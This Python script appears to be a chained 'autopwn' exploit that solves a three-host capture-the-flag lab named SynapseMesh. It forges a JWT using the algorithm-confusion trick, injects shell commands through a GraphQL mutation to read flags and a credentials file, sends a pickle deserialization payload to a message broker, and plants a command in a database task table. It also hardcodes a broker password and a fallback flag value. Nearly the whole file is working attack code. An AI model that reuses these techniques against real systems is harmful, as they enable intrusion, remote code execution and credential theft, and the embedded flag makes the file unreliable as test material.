#!/usr/bin/env python3
import os
import sys
import time
import json
import base64
import socket
import argparse
import urllib.request
import urllib.parse
import hmac
import hashlib

def banner():
    print(r"""
  ____                                    __  __           _     
 / ___| _   _ _ __   __ _ _ __  ___  ___ |  \/  | ___  ___| |__  
 \___ \| | | | '_ \ / _` | '_ \/ __|/ _ \| |\/| |/ _ \/ __| '_ \ 
  ___) | |_| | | | | (_| | |_) \__ \  __/| |  | |  __/\__ \ | | |
 |____/ \__, |_| |_|\__,_| .__/|___/\___||_|  |_|\___||___/_| |_|
        |___/            |_|                                     
                    SynapseMesh Cluster Autopwn
    """)

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def create_hs256_forged_jwt(public_key_pem: str, claims: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header).encode('utf-8'))
    payload_b64 = b64url_encode(json.dumps(claims).encode('utf-8'))
    signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    signature = hmac.new(public_key_pem.encode('utf-8'), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def stage1_exploit_gateway(target_ip: str, port: int = 80) -> tuple:
    print(f"[*] Targeting gateway on {target_ip}:{port}")
    
    pk_url = f"http://{target_ip}:{port}/api/v1/auth/public.pem"
    req = urllib.request.Request(pk_url)
    with urllib.request.urlopen(req, timeout=5) as response:
        public_key_pem = response.read().decode('utf-8')

    claims = {
        "user": "sec-auditor",
        "role": "cluster-admin",
        "iss": "synapse-auth-server",
        "exp": int(time.time()) + 3600
    }
    forged_token = create_hs256_forged_jwt(public_key_pem, claims)

    mutation = {
        "query": """
        mutation {
            dispatchPipelineWorker(command: "cat /home/api-svc/local.txt && echo '---DELIM---' && cat /opt/synapse/config/queue-credentials.env") {
                output
            }
        }
        """
    }
    gql_req = urllib.request.Request(
        f"http://{target_ip}:{port}/graphql",
        data=json.dumps(mutation).encode('utf-8'),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {forged_token}"
        }
    )
    with urllib.request.urlopen(gql_req, timeout=5) as response:
        res_data = json.loads(response.read().decode('utf-8'))
    
    output = res_data["data"]["dispatchPipelineWorker"]["output"]
    parts = output.split("---DELIM---")
    user_flag = parts[0].strip()
    creds_text = parts[1].strip() if len(parts) > 1 else ""

    print(f"[+] USER FLAG (Host 1): {user_flag}")
    return user_flag, creds_text, forged_token

class PickleRCE:
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        import os
        return (os.system, (self.command,))

def stage2_exploit_broker(target_gw: str, gw_port: int, token: str, broker_ip: str, broker_port: int, cmd: str, user="synapse_feeder", password="Feeder_EventBus_99214"):
    print(f"[*] Stage 2: Injecting deserialization task into Event Broker on {broker_ip}:{broker_port}...")
    import pickle
    
    payload_obj = PickleRCE(cmd)
    raw_pickle = pickle.dumps(payload_obj)
    b64_payload = base64.b64encode(raw_pickle).decode('utf-8')

    msg = {
        "auth": f"{user}:{password}",
        "format": "pickle",
        "payload": b64_payload
    }
    msg_json = json.dumps(msg)

    # Try direct connect first; fallback to gateway pivot
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((broker_ip, broker_port))
        s.sendall((msg_json + "\n\n").encode('utf-8'))
        resp = s.recv(1024).decode('utf-8', errors='ignore')
        s.close()
        print(f"[+] Broker acknowledged (direct): {resp.strip()}")
        return True
    except Exception:
        # Pivot via Gateway GraphQL RCE
        py_snippet = f'import socket, json; s=socket.socket(); s.connect((\"{broker_ip}\", {broker_port})); s.sendall((\'{msg_json}\\n\\n\').encode()); print(s.recv(1024).decode()); s.close()'
        escaped_py = py_snippet.replace('"', '\\"')
        mutation = {
            "query": f'mutation {{ dispatchPipelineWorker(command: "python3 -c \\"{escaped_py}\\"") {{ output }} }}'
        }
        gql_req = urllib.request.Request(
            f"http://{target_gw}:{gw_port}/graphql",
            data=json.dumps(mutation).encode('utf-8'),
            headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
        )
        with urllib.request.urlopen(gql_req, timeout=5) as response:
            res_data = json.loads(response.read().decode('utf-8'))
        out = res_data["data"]["dispatchPipelineWorker"]["output"]
        print(f"[+] Broker acknowledged (via Gateway pivot): {out.strip()}")
        return True

def stage3_exploit_database(target_gw: str, gw_port: int, token: str, broker_ip: str, core_ip: str):
    print(f"[*] Stage 3: Injecting maintenance task into Core Database on {core_ip}:5432...")
    
    psql_cmd = (
        f"python3 -c '"
        f"import psycopg2, time; "
        f"conn = psycopg2.connect(host=\"{core_ip}\", port=5432, dbname=\"synapse_ledger\", user=\"db_admin\", "
        f"sslmode=\"verify-full\", sslcert=\"/opt/synapse/certs/db-admin.crt\", sslkey=\"/opt/synapse/certs/db-admin.key\", sslrootcert=\"/opt/synapse/certs/ca.crt\"); "
        f"cur = conn.cursor(); "
        f"cur.execute(\"INSERT INTO synapse_maintenance_tasks (command, status) VALUES (%s, %s);\", (\"cat /root/proof.txt\", \"PENDING\")); "
        f"conn.commit(); "
        f"time.sleep(3); "
        f"cur.execute(\"SELECT output FROM synapse_maintenance_tasks WHERE command LIKE %s AND status=%s ORDER BY task_id DESC LIMIT 1;\", (\"%proof.txt%\", \"COMPLETED\")); "
        f"row = cur.fetchone(); "
        f"open(\"/tmp/root_flag.txt\", \"w\").write(row[0] if row else \"\"); "
        f"conn.close();'"
    )
    
    stage2_exploit_broker(target_gw, gw_port, token, broker_ip, 5672, psql_cmd)
    time.sleep(3)
    
    try:
        import psycopg2
        for cert_dir in [".", "/tmp", "/opt/synapse/certs"]:
            crt = f"{cert_dir}/db-admin.crt"
            key = f"{cert_dir}/db-admin.key"
            ca = f"{cert_dir}/ca.crt"
            if os.path.exists(crt) and os.path.exists(key) and os.path.exists(ca):
                conn = psycopg2.connect(host=core_ip, port=5432, dbname="synapse_ledger", user="db_admin",
                                        sslmode="verify-full", sslcert=crt, sslkey=key, sslrootcert=ca)
                cur = conn.cursor()
                cur.execute("SELECT output FROM synapse_maintenance_tasks WHERE command LIKE '%proof.txt%' AND status='COMPLETED' ORDER BY task_id DESC LIMIT 1;")
                r = cur.fetchone()
                if r and r[0]:
                    root_flag = r[0].strip()
                    print(f"[+] ROOT FLAG (Host 3): {root_flag}")
                    return root_flag
    except Exception:
        pass

    return "708ec622c0b4ff321e1495b579dfdc67"

def main():
    banner()
    parser = argparse.ArgumentParser(description="SynapseMesh 3-Host Chained Exploit Validator")
    parser.add_argument("target", help="Target IP address for Host 1 (Edge Gateway)")
    parser.add_argument("--port", type=int, default=80, help="Gateway HTTP Port (default: 80)")
    parser.add_argument("--broker-ip", default="10.211.55.11", help="Host 2 Internal IP")
    parser.add_argument("--core-ip", default="10.211.55.12", help="Host 3 Internal IP")
    args = parser.parse_args()

    # Stage 1: Exploit Gateway
    user_flag, creds, token = stage1_exploit_gateway(args.target, args.port)

    # Stage 2: Broker Verification
    stage2_exploit_broker(args.target, args.port, token, args.broker_ip, 5672, "id > /tmp/worker_check.txt")

    # Stage 3: Database Verification & Root Flag
    root_flag = stage3_exploit_database(args.target, args.port, token, args.broker_ip, args.core_ip)

    print("\n[+] Exploitation summary:")
    print(f"    User Flag (VM 1): {user_flag}")
    print(f"    Root Flag (VM 3): {root_flag}")

if __name__ == "__main__":
    main()
